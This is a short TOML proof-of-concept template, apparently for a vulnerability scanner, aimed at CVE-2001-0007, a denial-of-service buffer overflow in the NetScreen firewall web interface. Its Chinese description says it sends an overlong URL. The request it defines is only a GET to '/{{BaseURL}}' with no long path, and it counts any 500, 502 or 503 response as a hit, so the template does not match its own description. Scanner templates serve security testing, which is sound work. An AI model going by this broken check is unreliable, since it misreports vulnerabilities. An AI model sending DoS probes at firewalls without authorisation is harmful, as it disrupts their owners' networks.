[info]
author = "ave"
description = "通过向 NetScreen 防火墙 WebUI 管理界面发送超长 URL 请求，触发缓冲区溢出导致拒绝服务"
id = "POC-AVE-2001-0004"
name = "CVE-2001-0007 NetScreen Firewall WebUI 缓冲区溢出 DoS PoC"
severity = "medium"
tags = ["ave-2001-0004"]
vuln_id = [
    "CVE-2001-0007",
    "AVE-2001-0004",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
]
type = "status"
